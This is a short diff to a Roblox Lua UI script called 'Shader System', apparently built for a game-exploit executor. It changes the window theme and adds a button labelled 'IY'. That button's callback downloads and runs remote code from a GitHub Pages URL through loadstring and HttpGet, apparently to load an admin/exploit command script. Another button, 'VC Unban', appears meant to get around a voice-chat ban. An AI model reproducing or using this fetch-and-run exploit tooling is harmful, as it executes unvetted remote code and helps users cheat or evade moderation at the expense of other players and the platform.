@@ -5,7 +5,7 @@ local Window = Rayfield:CreateWindow({
     LoadingTitle = "Shader System",
     Icon = "sun", -- Lucide icon for the window
     LoadingSubtitle = "by artifaqt",
-    Theme = "Bloom",
+    Theme = "DarkBlue",
     KeySystem = false -- Removed configuration-saving to avoid issues
 })
 
@@ -305,10 +305,18 @@ Slider_Saturation = EffectsTab:CreateSlider({
 })
 
 --Useful Other Stuff
-local Button = OtherTab:CreateButton({
+OtherTab:CreateButton({
     Name = "VC Unban",
     Callback = function()
              local IsStudio = false
  game:GetService("VoiceChatService"):joinVoice()
     end,
  })
+
+OtherTab:CreateButton({
+    Name = "IY",
+    Callback = function()
+             local IsStudio = false
+loadstring(game:HttpGet("https://infyiff.github.io/resources/IY_FE.txt"))()
+end,
+})
